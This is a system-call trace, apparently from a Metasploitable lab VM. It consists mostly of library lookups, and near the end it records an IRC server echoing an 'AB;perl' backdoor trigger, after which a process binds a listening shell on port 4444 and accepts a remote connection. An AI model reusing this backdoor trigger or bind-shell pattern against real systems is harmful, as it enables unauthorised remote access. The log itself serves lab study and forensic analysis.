5780  07:10:39.196013 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196026 stat64("/lib/tls/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196037 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196059 stat64("/lib/tls/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196072 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196129 stat64("/lib/tls/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196141 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196154 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5780  07:10:39.196172 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196185 stat64("/lib/i686/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196210 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196222 stat64("/lib/i686/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196233 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196245 stat64("/lib/i686/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196256 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196267 stat64("/lib/i686", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196278 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196290 stat64("/lib/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196300 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196312 stat64("/lib/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196322 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196334 stat64("/lib/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196344 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196356 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5780  07:10:39.196372 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196385 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196397 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196409 stat64("/usr/lib/tls/i686/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196420 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196433 stat64("/usr/lib/tls/i686/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196444 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196456 stat64("/usr/lib/tls/i686", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196467 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196479 stat64("/usr/lib/tls/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196491 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196503 stat64("/usr/lib/tls/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196514 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196526 stat64("/usr/lib/tls/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196540 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196562 stat64("/usr/lib/tls", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196599 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196613 stat64("/usr/lib/i686/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196639 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196651 stat64("/usr/lib/i686/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196662 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196675 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5780  07:10:39.196692 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196704 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5780  07:10:39.196721 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196733 stat64("/usr/lib/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196744 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196756 stat64("/usr/lib/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196766 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196778 stat64("/usr/lib/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196789 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196800 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
5780  07:10:39.196817 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196830 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196843 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196856 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196868 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196881 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196893 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196905 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196917 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196931 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196943 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196955 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196967 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.196980 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.196991 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197004 stat64("/lib/i486-linux-gnu/tls", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197015 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197028 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197040 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197064 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197099 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197112 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197141 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197154 stat64("/lib/i486-linux-gnu/i686", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197166 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197179 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197190 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197203 stat64("/lib/i486-linux-gnu/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197214 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197227 stat64("/lib/i486-linux-gnu/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197238 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197251 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5780  07:10:39.197268 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197282 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197294 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197308 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197320 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197334 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197346 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197359 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197371 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197384 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197396 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197409 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197421 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197434 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197446 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197459 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197470 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197483 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197496 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197509 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.197523 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.197537 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.198132 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.198163 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.198189 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.198202 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.198214 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.198226 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.198238 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.198251 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfbb784c) = -1 ENOENT (No such file or directory)
5780  07:10:39.198263 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5780  07:10:39.198275 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5780  07:10:39.198294 munmap(0xb7cff000, 29913) = 0
5780  07:10:39.198314 open("/etc/ld.so.cache", O_RDONLY) = 6
5780  07:10:39.198327 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5780  07:10:39.198343 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7cff000
5780  07:10:39.198353 close(6)          = 0
5780  07:10:39.198364 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5780  07:10:39.198378 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
5780  07:10:39.198393 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5780  07:10:39.198482 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
5780  07:10:39.198504 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7cf4000
5780  07:10:39.198516 mmap2(0xb7cfd000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7cfd000
5780  07:10:39.198532 close(6)          = 0
5780  07:10:39.198556 munmap(0xb7cff000, 29913) = 0
5780  07:10:39.198579 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
5780  07:10:39.198628 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
5780  07:10:39.198644 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
5780  07:10:39.198696 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d06000
5780  07:10:39.198707 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
5780  07:10:39.198894 close(6)          = 0
5780  07:10:39.198904 munmap(0xb7d06000, 4096) = 0
5780  07:10:39.198923 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
5780  07:10:39.198937 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
5780  07:10:39.198953 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d06000
5780  07:10:39.198963 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
5780  07:10:39.199189 close(6)          = 0
5780  07:10:39.199199 munmap(0xb7d06000, 4096) = 0
5780  07:10:39.199229 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
5780  07:10:39.199252 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7d58) = -1 EINVAL (Invalid argument)
5780  07:10:39.199266 _llseek(6, 0, 0xbfbb7da0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5780  07:10:39.199278 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7d58) = -1 EINVAL (Invalid argument)
5780  07:10:39.199288 _llseek(6, 0, 0xbfbb7da0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5780  07:10:39.199298 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
5780  07:10:39.199357 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
5780  07:10:39.199394 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
5780  07:10:39.199419 listen(6, 5)      = 0
5780  07:10:39.199478 accept(6,  <unfinished ...>
5779  07:10:39.205861 exit_group(0)     = ?
5777  07:10:39.205940 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 5779
5777  07:10:39.205956 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5777  07:10:39.205967 --- SIGCHLD (Child exited) @ 0 (0) ---
5777  07:10:39.205975 waitpid(-1, 0xbf82ab98, WNOHANG) = -1 ECHILD (No child processes)
5777  07:10:39.206076 sigreturn()       = ? (mask now [])
5777  07:10:39.206123 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
5777  07:10:39.206198 exit_group(0)     = ?
4519  07:10:39.206247 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 5777
4519  07:10:39.206259 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:10:39.206273 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:10:39.206284 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:10:39.206293 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:10:39.206312 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:10:39.206375 time(NULL)        = 1495624239
4519  07:10:39.206385 time(NULL)        = 1495624239
4519  07:10:39.206424 gettimeofday({1495624239, 206444}, NULL) = 0
4519  07:10:39.206454 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:10:39.206485 clock_gettime(CLOCK_MONOTONIC, {1049, 23498142}) = 0
4519  07:10:39.206497 gettimeofday({1495624239, 206501}, NULL) = 0
4519  07:10:39.206508 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
5780  07:10:39.492564 <... accept resumed> {sa_family=AF_INET, sin_port=htons(43939), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
5780  07:10:39.492634 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb6d48) = -1 EINVAL (Invalid argument)
5780  07:10:39.492650 _llseek(8, 0, 0xbfbb6d90, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5780  07:10:39.492662 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb6d48) = -1 EINVAL (Invalid argument)
5780  07:10:39.492673 _llseek(8, 0, 0xbfbb6d90, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5780  07:10:39.492683 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
5780  07:10:39.492740 close(6)          = 0
